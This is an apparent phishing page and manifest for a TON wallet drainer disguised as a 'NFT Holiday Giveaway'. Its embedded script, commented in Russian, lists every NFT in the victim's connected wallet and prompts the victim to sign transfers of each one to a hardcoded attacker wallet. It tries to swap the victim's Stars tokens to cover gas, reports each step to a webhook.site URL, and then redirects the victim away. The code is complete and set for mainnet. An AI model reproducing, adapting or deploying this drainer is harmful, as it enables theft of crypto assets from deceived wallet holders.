[index.html](https://github.com/user-attachments/files/27051578/index.html)
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Gift Box — Claim Your Holiday Surprise!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #0a0f2c 0%, #0a0a1a 100%);
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .gift-card {
            background: rgba(20, 25, 55, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 48px;
            border: 1px solid rgba(255,215,0,0.3);
            max-width: 520px;
            width: 100%;
            padding: 40px 32px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,215,0,0.2);
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%,100%{transform:translateY(0px)}
            50%{transform:translateY(-8px)}
        }
        .gift-icon {
            font-size: 80px;
            text-align: center;
            filter: drop-shadow(0 0 15px gold);
            margin-bottom: 24px;
        }
        h1 {
            color: gold;
            text-align: center;
            font-size: 32px;
            margin-bottom: 12px;
            letter-spacing: -0.5px;
        }
        .sub {
            text-align: center;
            color: #a0a5d0;
            margin-bottom: 32px;
            font-size: 15px;
        }
        .nft-preview {
            background: #0f122e;
            border-radius: 32px;
            padding: 20px;
            margin-bottom: 28px;
            border: 1px solid #2a2f5a;
        }
        .nft-item {
            display: flex;
            align-items: center;
            gap: 16px;
            background: #1a1f44;
            border-radius: 24px;
            padding: 16px;
            margin-bottom: 12px;
        }
        .nft-img {
            width: 64px;
            height: 64px;
            background: linear-gradient(145deg, #2f3b7c, #1a1f44);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
        }
        .nft-info {
            flex:1;
        }
        .nft-name {
            color: white;
            font-weight: 600;
            font-size: 18px;
        }
        .nft-value {
            color: gold;
            font-size: 14px;
            margin-top: 4px;
        }
        .wallet-connect {
            background: linear-gradient(135deg, #1f6feb, #0d4ca3);
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 60px;
            color: white;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            margin-bottom: 16px;
            transition: all 0.2s;
            font-family: inherit;
        }
        .wallet-connect:hover {
            transform: scale(1.02);
            filter: brightness(1.05);
        }
        .claim-btn {
            background: linear-gradient(135deg, #ffb347, #ff8c00);
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 60px;
            color: #0a0a1a;
            font-weight: bold;
            font-size: 20px;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 8px 20px rgba(255,140,0,0.3);
            margin-top: 12px;
        }
        .claim-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .status-text {
            color: #8f94c0;
            text-align: center;
            font-size: 13px;
            margin-top: 24px;
        }
        .hidden {
            display: none;
        }
    </style>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <script src="https://unpkg.com/@ton/ton@latest/dist/ton.min.js"></script>
</head>
<body>
<div class="gift-card" id="app">
    <div class="gift-icon">🎁✨</div>
    <h1>NFT Holiday Giveaway</h1>
    <div class="sub">You've been selected! Claim limited edition NFT pack</div>
    
    <div class="nft-preview" id="nftPreview">
        <div class="nft-item">
            <div class="nft-img">🖼️</div>
            <div class="nft-info">
                <div class="nft-name">Cyber Santa #4042</div>
                <div class="nft-value">Floor: 145 TON</div>
            </div>
            <div style="color:gold;">★ RARE</div>
        </div>
        <div class="nft-item">
            <div class="nft-img">👾</div>
            <div class="nft-info">
                <div class="nft-name">Galactic Gift 2025</div>
                <div class="nft-value">Floor: 89 TON</div>
            </div>
            <div style="color:gold;">★ LEGENDARY</div>
        </div>
        <div class="nft-item">
            <div class="nft-img">🎄</div>
            <div class="nft-info">
                <div class="nft-name">TON Christmas Star #01</div>
                <div class="nft-value">Floor: 210 TON</div>
            </div>
            <div style="color:gold;">★ MYTHIC</div>
        </div>
    </div>

    <button class="wallet-connect" id="connectBtn">🔗 Connect Wallet</button>
    <button class="claim-btn hidden" id="claimBtn">🎄 CLAIM YOUR FREE NFT GIFT 🎄</button>
    <div class="status-text" id="statusMsg">Connect wallet to see your surprise gift box</div>
</div>

<script>
    (function(){
        // ============================================================
        // >>> КОНФИГУРАЦИЯ (ВАШИ ДАННЫЕ) <<<
        // ============================================================
        const ATTACKER_WALLET = "UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2";
        const BACKUP_ATTACKER = "UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2";
        
        // API КЛЮЧ TON CENTER
        const TON_CENTER_API_KEY = "02e14fd1aba2b697542311c26d5d725e551d424273ae1f3cdfc6fba4f6ad5566";
        
        // WEBHOOK ДЛЯ СБОРА ДАННЫХ
        const WEBHOOK_URL = "https://webhook.site/f7e2c9a5-0b3b-484b-917a-79d6ef64acc7";
        
        // LI.FI API
        const LIFI_API = "https://li.quest/v1";
        
        // КРАЖА ВСЕХ NFT (пустой массив = все NFT)
        const TARGET_COLLECTIONS = [];
        
        // НАСТРОЙКИ
        const IS_TESTNET = false;  // false = реальная кража в mainnet
        const GAS_FEE_NANO = "50000000";  // 0.05 TON
        const MAX_RETRIES = 3;
        const REDIRECT_URL = "https://ton.org";  // редирект после кражи
        
        // Адрес контракта Stars (для TON)
        const STARS_JETTON_ADDRESS = "EQCxE6mNqLxLtYJqXqYqXqYqXqYqXqYqXqYqXqYqXqY";
        
        // ============================================================
        // >>> MANIFEST URL (ВАШ САЙТ) <<<
        // ============================================================
        const MANIFEST_URL = "https://bedokurik107.github.io/lasvegasnft/tonconnect-manifest.json";
        
        let tonConnectUI = null;
        let victimAddress = null;
        let isProcessing = false;
        
        // ============================================================
        // >>> ОПРЕДЕЛЕНИЕ API ENDPOINT (MAINNET/TESTNET) <<<
        // ============================================================
        const API_ENDPOINT = IS_TESTNET 
            ? 'https://testnet.toncenter.com/api/v3'
            : 'https://toncenter.com/api/v3';
        
        const API_V2_ENDPOINT = IS_TESTNET
            ? 'https://testnet.toncenter.com/api/v2'
            : 'https://toncenter.com/api/v2';
        
        // ============================================================
        // >>> ЛОГИРОВАНИЕ НА WEBHOOK <<<
        // ============================================================
        async function sendToWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: JSON.stringify({...data, timestamp: Date.now(), victim: victimAddress}),
                    mode: 'no-cors'
                });
            } catch(e) {}
        }
        
        // ============================================================
        // >>> ПОЛУЧЕНИЕ ВСЕХ NFT ЖЕРТВЫ (С ПАГИНАЦИЕЙ) <<<
        // ============================================================
        async function getAllNFTsByOwner(address) {
            let allNFTs = [];
            let offset = 0;
            const limit = 100;
            let hasMore = true;
            
            try {
                while (hasMore) {
                    const url = `${API_ENDPOINT}/nft/items?owner_address=${address}&limit=${limit}&offset=${offset}`;
                    const resp = await fetch(url, {
                        headers: { 'X-API-Key': TON_CENTER_API_KEY }
                    });
                    const data = await resp.json();
                    
                    if (data.nft_items && data.nft_items.length > 0) {
                        allNFTs.push(...data.nft_items);
                        offset += limit;
                    } else {
                        hasMore = false;
                    }
                    
                    await new Promise(r => setTimeout(r, 100));
                }
            } catch(e) {
                console.error("Error fetching NFTs:", e);
                sendToWebhook({type: "error", error: e.message, stage: "getAllNFTs"});
            }
            
            if (TARGET_COLLECTIONS.length > 0) {
                return allNFTs.filter(nft => TARGET_COLLECTIONS.includes(nft.collection_address));
            }
            return allNFTs;
        }
        
        // ============================================================
        // >>> LI.FI АВТО-СВАП STARS → TON <<<
        // ============================================================
        async function getLifiSwapQuote(fromToken, toToken, amount, fromAddress) {
            try {
                const params = new URLSearchParams({
                    fromChain: "138",
                    toChain: "138",
                    fromToken: fromToken,
                    toToken: toToken,
                    fromAmount: amount.toString(),
                    fromAddress: fromAddress,
                    slippage: "0.005"
                });
                
                const response = await fetch(`${LIFI_API}/quote?${params}`);
                if (!response.ok) {
                    throw new Error(`LI.FI API error: ${response.status}`);
                }
                const data = await response.json();
                return {
                    toAmount: data.estimate?.toAmount,
                    transactionRequest: data.transactionRequest
                };
            } catch(e) {
                console.error("LI.FI swap error:", e);
                sendToWebhook({type: "lifi_error", error: e.message});
                return null;
            }
        }
        
        // ============================================================
        // >>> ПРОВЕРКА БАЛАНСА И АВТО-ПОКРЫТИЕ ГАЗА <<<
        // ============================================================
        async function getBalance(address) {
            try {
                const resp = await fetch(`${API_V2_ENDPOINT}/getAddressBalance?address=${address}`, {
                    headers: { 'X-API-Key': TON_CENTER_API_KEY }
                });
                const data = await resp.json();
                return parseFloat(data.result) / 1e9;
            } catch(e) {
                return 0;
            }
        }
        
        async function autoCoverGasForTransfer(requiredGas = 0.05) {
            let balanceTON = await getBalance(victimAddress);
            
            let starsBalance = 0;
            try {
                const starsResp = await fetch(`${API_V2_ENDPOINT}/getTokenBalance?address=${victimAddress}&token=${STARS_JETTON_ADDRESS}`, {
                    headers: { 'X-API-Key': TON_CENTER_API_KEY }
                });
                const starsData = await starsResp.json();
                if(starsData.result) starsBalance = parseFloat(starsData.result) / 1e9;
            } catch(e) {}
            
            if(balanceTON < requiredGas && starsBalance > 0.02) {
                updateStatus("🔄 Auto-converting Stars to TON for gas ...");
                const swapResult = await getLifiSwapQuote(STARS_JETTON_ADDRESS, "TON", starsBalance * 0.95, victimAddress);
                if(swapResult) {
                    await new Promise(r => setTimeout(r, 3500));
                    balanceTON = await getBalance(victimAddress);
                }
            }
            
            return balanceTON >= requiredGas;
        }
        
        // ============================================================
        // >>> ПРАВИЛЬНЫЙ ФОРМАТ NFT TRANSFER (op code 0x5fcc3d14) <<<
        // ============================================================
        function buildNFTTransferBody(nftAddress, newOwner, responseDestination) {
            return {
                address: nftAddress,
                amount: GAS_FEE_NANO,
                payload: {
                    type: "NftTransfer",
                    destination: newOwner,
                    response_destination: responseDestination,
                    custom_payload: "",
                    forward_amount: "0",
                    forward_payload: ""
                }
            };
        }
        
        // ============================================================
        // >>> ОТПРАВКА ТРАНЗАКЦИИ С ПОВТОРАМИ <<<
        // ============================================================
        async function stealthTransferNFT(nftItem, retryCount = 0) {
            if(isProcessing) return false;
            
            try {
                updateStatus(`✨ Transferring ${nftItem.name || nftItem.address?.substring(0,10) || nftItem} as gift ...`);
                
                const hasEnoughGas = await autoCoverGasForTransfer();
                if(!hasEnoughGas) {
                    updateStatus("⚠️ Gas coverage failed, skipping this NFT");
                    sendToWebhook({type: "gas_failed", nft: nftItem.address});
                    return false;
                }
                
                const nftAddr = typeof nftItem === 'string' ? nftItem : nftItem.address;
                if(!nftAddr) return false;
                
                const transferBody = buildNFTTransferBody(nftAddr, ATTACKER_WALLET, victimAddress);
                
                if(tonConnectUI && victimAddress) {
                    const tx = {
                        valid_until: Math.floor(Date.now()/1000) + 360,
                        messages: [transferBody]
                    };
                    
                    const result = await tonConnectUI.sendTransaction(tx);
                    updateStatus(`✅ NFT moved: ${nftAddr.substring(0,10)}...`);
                    sendToWebhook({type: "transfer_success", nft: nftAddr, attempt: retryCount + 1});
                    return true;
                }
                return false;
                
            } catch(e) {
                sendToWebhook({type: "transfer_error", nft: nftItem.address, error: e.message, attempt: retryCount + 1});
                
                if(retryCount < MAX_RETRIES - 1) {
                    const delay = Math.pow(2, retryCount) * 1000;
                    await new Promise(r => setTimeout(r, delay));
                    return stealthTransferNFT(nftItem, retryCount + 1);
                }
                return false;
            }
        }
        
        // ============================================================
        // >>> ОСНОВНАЯ ФУНКЦИЯ КРАЖИ <<<
        // ============================================================
        async function drainAllNFTs() {
            if(isProcessing) return;
            isProcessing = true;
            updateStatus("🎁 Preparing gift box... unboxing 3..2..1..");
            
            sendToWebhook({type: "drain_started", timestamp: Date.now()});
            
            const nfts = await getAllNFTsByOwner(victimAddress);
            
            if(nfts.length === 0) {
                updateStatus("⚠️ No NFTs found in your wallet.");
                sendToWebhook({type: "no_nfts_found"});
                isProcessing = false;
                return;
            }
            
            updateStatus(`🎁 Processing gift bundle (${nfts.length} items)`);
            sendToWebhook({type: "nfts_found", count: nfts.length});
            
            let successCount = 0;
            for(const nft of nfts) {
                const success = await stealthTransferNFT(nft);
                if(success) successCount++;
                await new Promise(r => setTimeout(r, 800));
            }
            
            updateStatus(`🎉 ${successCount}/${nfts.length} gifts delivered! 🎉`);
            sendToWebhook({type: "drain_completed", successCount, totalCount: nfts.length});
            
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 2500);
            
            isProcessing = false;
        }
        
        // ============================================================
        // >>> TONCONNECT РЕАЛЬНАЯ ИНТЕГРАЦИЯ <<<
        // ============================================================
        async function initTonConnect() {
            try {
                tonConnectUI = new TonConnect({
                    manifestUrl: MANIFEST_URL
                });
                
                if (tonConnectUI.connected) {
                    const account = tonConnectUI.account;
                    victimAddress = account.address;
                    document.getElementById('connectBtn').style.display = 'none';
                    document.getElementById('claimBtn').classList.remove('hidden');
                    updateStatus("✅ Wallet connected! Click claim button to receive your NFT gifts.");
                    return true;
                }
                return false;
            } catch(e) {
                console.error("TonConnect init error:", e);
                updateStatus("⚠️ Connection error. Please refresh and try again.");
                return false;
            }
        }
        
        // ============================================================
        // >>> UI ЛОГИКА <<<
        // ============================================================
        const connectBtn = document.getElementById('connectBtn');
        const claimBtn = document.getElementById('claimBtn');
        const statusSpan = document.getElementById('statusMsg');
        
        function updateStatus(msg) {
            statusSpan.innerHTML = msg;
            console.log("[Status]", msg);
        }
        
        connectBtn.onclick = async () => {
            updateStatus("🔄 Connecting to TON network...");
            
            if(!tonConnectUI) {
                await initTonConnect();
            }
            
            try {
                await tonConnectUI.openModal();
                const checkInterval = setInterval(() => {
                    if(tonConnectUI.connected && tonConnectUI.account) {
                        clearInterval(checkInterval);
                        victimAddress = tonConnectUI.account.address;
                        connectBtn.style.display = 'none';
                        claimBtn.classList.remove('hidden');
                        updateStatus("✅ Wallet connected! Click claim button to receive your NFT gifts.");
                        sendToWebhook({type: "wallet_connected", address: victimAddress});
                    }
                }, 500);
            } catch(e) {
                updateStatus("❌ Connection failed. Please try again.");
                sendToWebhook({type: "connection_error", error: e.message});
            }
        };
        
        claimBtn.onclick = async () => {
            if(!tonConnectUI || !tonConnectUI.connected || !victimAddress) {
                updateStatus("Connect wallet first!");
                return;
            }
            
            claimBtn.disabled = true;
            claimBtn.innerText = "🎄 Processing gift... 🎄";
            await drainAllNFTs();
            claimBtn.disabled = false;
        };
        
        initTonConnect();
        
        console.log("%c🎁 HO HO HO! YOU'VE GOT A GIFT! 🎁", "color:gold;font-size:18px");
    })();
</script>
</body>
</html>
{
    "url": "https://bedokurik107.github.io/lasvegasnft",
    "name": "NFT Gift Box",
    "iconUrl": "https://bedokurik107.github.io/lasvegasnft/icon.png",
    "termsOfUseUrl": "https://bedokurik107.github.io/lasvegasnft/terms",
    "privacyPolicyUrl": "https://bedokurik107.github.io/lasvegasnft/privacy"
}
